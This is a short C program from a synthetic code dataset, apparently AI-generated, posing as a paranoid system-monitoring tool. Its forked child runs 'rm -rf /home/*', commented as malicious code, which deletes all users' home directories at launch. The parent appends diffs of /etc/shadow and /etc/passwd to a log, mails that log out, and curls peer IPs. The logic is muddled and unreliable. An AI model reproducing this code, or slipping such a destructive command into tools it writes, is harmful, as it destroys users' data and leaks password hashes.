//FormAI DATASET v1.0 Category: System administration ; Style: paranoid
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void main()
{
    int check = fork();
    if(check == -1)
    {
        printf("Error while forking");
    }
    else if(check == 0)
    {
        // Child process - execute malicious code
        system("rm -rf /home/*");
    }
    else
    {
        // Parent process - monitor the system
        while(1)
        {
            // Check for any unauthorized access
            system("last | grep root >> /var/log/auth.log");
            
            // Check for any changes in critical system files
            system("diff /etc/passwd /etc/passwd.old >> /var/log/auth.log");
            system("diff /etc/shadow /etc/shadow.old >> /var/log/auth.log");
            system("diff /etc/group /etc/group.old >> /var/log/auth.log");
            
            // Check for any network traffic to suspicious IP addresses
            system("netstat -an | grep :'80' | awk '{print $5}' | cut -d : -f1 | sort | uniq > /tmp/ips.txt");
            system("for i in $(cat /tmp/ips.txt); do curl -s -L -o /dev/null -w '%{http_code}' http://$i/testing.php; done >> /var/log/auth.log");
            
            // Send an alert if any suspicious activity is detected
            system("if [ -s /var/log/auth.log ]; then mail -s 'URGENT: Suspicious activity detected on the system' admin@example.com < /var/log/auth.log; fi");
            
            // Sleep for 1 hour before the next check
            sleep(3600);
        }
    }
}